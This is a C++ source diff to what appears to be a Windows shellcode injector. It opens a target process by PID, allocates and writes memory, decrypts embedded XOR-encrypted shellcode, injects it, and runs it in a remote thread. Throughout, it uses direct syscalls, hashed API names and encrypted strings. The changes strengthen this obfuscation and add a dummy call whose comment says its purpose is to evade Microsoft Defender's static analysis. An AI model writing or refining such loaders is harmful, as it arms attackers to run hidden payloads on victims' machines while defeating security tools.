@@ -31,7 +31,7 @@ int main(int argc, char *argv[]) {
       "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00");
   if (argc != 2)
     throw std::runtime_error(
-        ng::obfuscation::xorDecode("ERQeIVR6MEQ/akg8PC01LCg="));
+        ng::obfuscation::xorRuntimeDecrypted<"Wrong arg count">().string());
 
   ng::syscalls syscalls;
   DWORD PID = std::stoi(argv[1]);
@@ -39,13 +39,14 @@ int main(int argc, char *argv[]) {
   OBJECT_ATTRIBUTES objectAttrs = {sizeof(objectAttrs), nullptr};
   CLIENT_ID clientId = {.UniqueProcess = reinterpret_cast<HANDLE>(PID),
                         .UniqueThread = NULL};
-  auto status = syscalls.SCall<NtOpenProcess>(
-      ng::obfuscation::fnv1Const("NtOpenProcess"), &processHandle,
-      PROCESS_ALL_ACCESS, &objectAttrs, &clientId);
+  auto status = syscalls.SCall<NtOpenProcess>("NtOpenProcess", &processHandle,
+                                              PROCESS_ALL_ACCESS, &objectAttrs,
+                                              &clientId);
   if (!NT_SUCCESS(status))
     throw std::runtime_error(
-        ng::obfuscation::xorDecode("BQkEI1c0dkJ4LU4naSJhGCcIFSNWej5YeD5DNmkzM"
-                                   "x8lAwI8H3o3VzEmTjdpNCgELlxR") +
+        ng::obfuscation::xorRuntimeDecrypted<
+            "Can't get a handle on the process failed with:">()
+            .string() +
         std::to_string(status));
 
   PVOID buf = NULL;
@@ -57,8 +58,9 @@ int main(int argc, char *argv[]) {
     syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                             processHandle);
     throw std::runtime_error(
-        ng::obfuscation::xorDecode("BQkEI1c0dkJ4LU4naTEkAyMUByoTNzRbNzhScyAtY"
-                                   "QQuA1E/QTUyUys5B3MvIigcIwJROFouOQx4") +
+        ng::obfuscation::xorRuntimeDecrypted<
+            "Can't reserve memory in the process failed with:">()
+            .string() +
         std::to_string(status));
   }
 
@@ -71,10 +73,11 @@ int main(int argc, char *argv[]) {
   if (!NT_SUCCESS(status)) {
     syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                             processHandle);
-    throw std::runtime_error(ng::obfuscation::xorDecode(
-                                 "BQkEI1c0dkJ4LU4naTQzGTIDUSJWNz5EIWpCPWk3LlAyD"
-                                 "hRvQyg+VT05WH9pJSAZKgMVb0QzJV5iag==") +
-                             std::to_string(status));
+    throw std::runtime_error(
+        ng::obfuscation::xorRuntimeDecrypted<
+            "Can't write memory in the process failed with:">()
+            .string() +
+        std::to_string(status));
   }
 
   HANDLE threadHandle = NULL;
@@ -87,26 +90,27 @@ int main(int argc, char *argv[]) {
     syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                             processHandle);
     throw std::runtime_error(
-        ng::obfuscation::xorDecode("BQkEI1c0dkJ4KVk2KDckUCgDBm9HMiNTOS4LOidjN"
-                                   "RgjRgE9XDk0RStmCzUoKi0VIkYGJkcyaxY=") +
+        ng::obfuscation::xorRuntimeDecrypted<
+            "Can't create thread in the process failed with:">()
+            .string() +
         std::to_string(status));
   }
 
   auto decryptedShellcode = ng::obfuscation::xorRuntime(encryptedShellcode);
-
   status = syscalls.SCall<NtWriteVirtualMemory>(
       ng::obfuscation::fnv1Const("NtWriteVirtualMemory"), processHandle, buf,
-      reinterpret_cast<PVOID>(decryptedShellcode.data()),
+      reinterpret_cast<PVOID>(decryptedShellcode.raw().data()),
       decryptedShellcode.size(), nullptr);
   if (!NT_SUCCESS(status)) {
     syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                             processHandle);
     syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                             threadHandle);
-    throw std::runtime_error(ng::obfuscation::xorDecode(
-                                 "BQkEI1c0dkJ4LU4naTQzGTIDUSJWNz5EIWpCPWk3LlAyD"
-                                 "hRvQyg+VT05WH9pJSAZKgMVb0QzJV5iag==") +
-                             std::to_string(status));
+    throw std::runtime_error(
+        ng::obfuscation::xorRuntimeDecrypted<
+            "Can't write memory in the process failed with:">()
+            .string() +
+        std::to_string(status));
   }
 
   status = syscalls.SCall<NtResumeThread>(
@@ -116,10 +120,10 @@ int main(int argc, char *argv[]) {
                             processHandle);
     syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"),
                             threadHandle);
-    throw std::runtime_error(
-        ng::obfuscation::xorDecode(
-            "BQkEI1c0dkJ4OE4gPC4kUDIOAypSPn0WPitCPywnYQcvEhl1Ew==") +
-        std::to_string(status));
+    throw std::runtime_error(ng::obfuscation::xorRuntimeDecrypted<
+                                 "Can't resume thread failed with:">()
+                                 .string() +
+                             std::to_string(status));
   }
 
   syscalls.SCall<NtWaitForSingleObject>(
@@ -127,5 +131,11 @@ int main(int argc, char *argv[]) {
       nullptr);
 
   syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"), threadHandle);
+
+  // bogus call to throw off microsoft defendres static analisis because we were
+  // getting flagged without this
+  syscalls.SCall<NtQuerySystemTime>(
+      ng::obfuscation::fnv1Const("NtQuerySystemTime"), nullptr);
+
   syscalls.SCall<NtClose>(ng::obfuscation::fnv1Const("NtClose"), processHandle);
 }
